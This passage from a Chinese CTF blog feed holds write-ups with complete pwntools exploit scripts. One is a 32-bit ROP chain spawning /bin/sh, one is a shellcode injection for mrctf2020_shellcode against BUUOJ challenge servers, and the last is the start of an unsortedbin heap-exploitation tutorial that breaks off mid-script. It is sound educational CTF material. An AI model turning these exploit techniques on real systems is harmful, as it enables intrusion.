class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br></pre></td></tr></table></figure><p>他已经自动帮我们生成好脚本了  我们只需要手动加上偏移 就可以pwn成功</p><p>但是这里需要注意 你需要添加一个库 如果没有这个库 脚本会报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/chen/exp.py&quot;, line 51, in &lt;module&gt;</span><br><span class="line">    p += pack(&#x27;&lt;I&#x27;, 0x0806ecda) # pop edx ; ret</span><br><span class="line">  File &quot;/home/chen/.local/lib/python3.6/site-packages/pwnlib/util/packing.py&quot;, line 102, in pack</span><br><span class="line">    if sign is None and number &lt; 0:</span><br><span class="line">TypeError: &#x27;&lt;&#x27; not supported between instances of &#x27;str&#x27; and &#x27;int&#x27;</span><br></pre></td></tr></table></figure><p>库:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from struct import pack</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_32&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">27246</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xc</span>+<span class="number">0x4</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80</span></span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mrctf2020_shellcode</title>
      <link href="/2022/11/23/mrctf2020-shellcode/"/>
      <url>/2022/11/23/mrctf2020-shellcode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>没有开NX保护 可以在内存上执行系统调用</p><p>拖到ida后发现f5报错 于是只能阅读汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001155 ; __unwind &#123;</span><br><span class="line">.text:0000000000001155                 push    rbp</span><br><span class="line">.text:0000000000001156                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001159                 sub     rsp, 410h</span><br><span class="line">.text:0000000000001160                 mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">.text:0000000000001167                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000000116C                 mov     rdi, rax        ; stream</span><br><span class="line">.text:000000000000116F                 call    _setbuf</span><br><span class="line">.text:0000000000001174                 mov     rax, cs:stdout@@GLIBC_2_2_5</span><br><span class="line">.text:000000000000117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000001180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001183                 call    _setbuf</span><br><span class="line">.text:0000000000001188                 mov     rax, cs:stderr@@GLIBC_2_2_5</span><br><span class="line">.text:000000000000118F                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000001194                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000001197                 call    _setbuf</span><br><span class="line">.text:000000000000119C                 lea     rdi, s          ; &quot;Show me your magic!&quot;    //断点1</span><br><span class="line">.text:00000000000011A3                 call    _puts</span><br><span class="line">.text:00000000000011A8                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000011AF                 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:00000000000011B4                 mov     rsi, rax        ; buf </span><br><span class="line">.text:00000000000011B7                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000000011BC                 mov     eax, 0</span><br><span class="line">.text:00000000000011C1                 call    _read                                     //断点2</span><br><span class="line">.text:00000000000011C6                 mov     [rbp+var_4], eax</span><br><span class="line">.text:00000000000011C9                 cmp     [rbp+var_4], 0</span><br><span class="line">.text:00000000000011CD                 jg      short loc_11D6                        //断点3</span><br><span class="line">.text:00000000000011CF                 mov     eax, 0</span><br><span class="line">.text:00000000000011D4                 jmp     short locret_11E4</span><br></pre></td></tr></table></figure><p>断点1:</p><p>在这之前的汇编代码 执行了两步 一是清空缓存区 防止数据输入输出出现问题 第二步调用puts函数输出了一段字符串</p><p>断点2:</p><p>调用了read函数 可以手动反编译为<strong>read(0,buf,0x400)</strong></p><p>断点3:</p><p>紧接着将**$eax<strong>的值赋给</strong>rbp+var_4**  与0进行比较</p><p>cmp的功能相当于减法指令，只是不保存结果</p><p>jg指令 如果大于就跳转 即如果$eax大于0就跳转到loc_11D6函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000011D6 loc_11D6:                               ; CODE XREF: main+78↑j</span><br><span class="line">.text:00000000000011D6                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000000011DD                 call    rax</span><br><span class="line">.text:00000000000011DF                 mov     eax, 0</span><br></pre></td></tr></table></figure><p>lea指令将$rbp+buf即我们上面通过read输入的变量的地址赋值给rax</p><p>随后利用call指令调用这个地址的内容</p><p>也就是说我们只要直接输入shellcode就可以做到系统调用</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29656</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Show me your magic!&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>unsortedbinAttack</title>
      <link href="/2022/11/21/unsortedbinAttack/"/>
      <url>/2022/11/21/unsortedbinAttack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>距离上一篇堆的知识点很长时间了  这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法</p><p>本文讲述unsortedbin在不同环境下的利用办法</p><p>这一部分还是比较简单的</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin</p><p>我们先留意一下随着glibc版本的不同  接着说回正文</p><p>一个堆块被释放以后 如果他的大小大于fastbin或者tcache的范围 那么他就会先进入unsortedbin</p><p>如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arean+0x88（这里的数值不是固定的）</p><p><a href="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b6ac916f2c2beb18c5165.png"></a></p><p>此时如果用户再次申请一个chunk</p><p>1.如果该chunk的大小不超过unsortedbin中的chunk大小  那么就会分割出用户需要的</p><p><a href="https://pic.imgdb.cn/item/637b6b6216f2c2beb18db731.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b6b6216f2c2beb18db731.png"></a></p><p>比如此时我再次申请一个0x40大小的堆块  就是从原来的free chunk中分割出来的  并且其fd和bk域的数值会保留下来</p><p>一起分配给了用户  所以我们可以利用这个特性泄露libc基址(如果程序有打印出chunk内容的机会)</p><p><strong>这里有个小疑点  为什么用户新申请出来的chunk的fd和bk会和原来的chunk的不一样(待解)</strong></p><h2 id="ubuntu16-04泄露基址"><a href="#ubuntu16-04泄露基址" class="headerlink" title="ubuntu16.04泄露基址"></a>ubuntu16.04泄露基址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>自己编译了一个简单的堆题</p><p>程序主体就简单发一下各函数就行了 内容也不必看 就知道有个打印chunk内容的机会和堆溢出 uaf等漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">  LODWORD(v0) = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;Page + v3);</span><br><span class="line">    <span class="keyword">if</span> ( !v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">256</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;over size&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v0 = <span class="built_in">malloc</span>(v2);</span><br><span class="line">        v4 = v0;</span><br><span class="line">        <span class="keyword">if</span> ( v0 )</span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;Page + v3) = v4;</span><br><span class="line">          Size[v3] = v2;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(&amp;Page + v1);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      result = vuln(*(&amp;Page + v1), Size[v1]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">    result = <span class="built_in">printf</span>(<span class="string">&quot;Content: %s\n&quot;</span>, *(&amp;Page + v1));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  result = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;Page + v1));</span><br><span class="line">    *(&amp;Page + v1) = <span class="number">0LL</span>;</span><br><span class="line">    result = v1;</span><br><span class="line">    Size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdb动调exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span 